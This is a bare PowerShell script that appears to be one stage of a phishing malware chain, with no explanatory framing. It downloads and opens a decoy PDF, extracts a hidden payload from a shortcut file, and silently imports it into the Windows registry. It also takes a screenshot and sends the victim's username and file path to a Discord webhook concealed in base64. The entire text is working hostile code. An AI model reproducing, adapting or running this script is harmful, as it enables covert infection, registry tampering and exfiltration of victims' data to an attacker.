iwr 'https://files.catbox.moe/xxlzez.pdf' -OutFile ($d = Join-Path $env:TEMP 'method.pdf'); ii $d

$1 = 2564417
$2 = 4137
$t = Join-Path $env:TEMP 'path.txt'
$currentPath = cat -Path $t
cd -Path $currentPath
$lps = dir -Path $dirPath.Path -Recurse *.lnk | ? { $_.length -eq $1 } | select -ExpandProperty FullName;
$lp = if ($lps -is [array]) {$lps[0]} else {$lps};
$ef = gc $lp -Encoding Byte -TotalCount $1 -ReadCount $1;
$ep = Join-Path $env:public '17399.reg';
sc $ep ([byte[]]($ef | select -Skip $2)) -Encoding Byte;
saps -FilePath 'regedit' -ArgumentList '/s', $ep;

# Scrnsht
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
$screenshotPath = Join-Path $env:TEMP "screenshot.png"
$bitmap.Save($screenshotPath)
$graphics.Dispose()
$bitmap.Dispose()

# Construct the JSON payload
$jsonPayload = @{
    embeds = @(
        @{
            title = ":fishing_pole_and_fish: **Hoocked**"
            description = "Username: $($env:USERNAME)"
            image = @{
                url = $screenshotPath
            }
        }
    )
} | ConvertTo-Json -Depth 4

$decodedUrl = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIwNzAzMDU3MjA2MTQyOTgxMC9ZQ2J3U29YM1JTbVAyRkNnTEpUR0dPN3FpaERFRUR6dzRmYzNSeXQ1bkY1STEtRVZXWUlRRTlld05QNDg5LTA4a1Vjdw=="))
Invoke-RestMethod -Uri $decodedUrl -Method Post -Body (@{content=":fishing_pole_and_fish: **Hooked:** $($env:USERNAME) - $($lps)"})

# Send the embed to the Discord webhook
Invoke-RestMethod -Uri $decodedUrl -Method Post -Body $jsonPayload

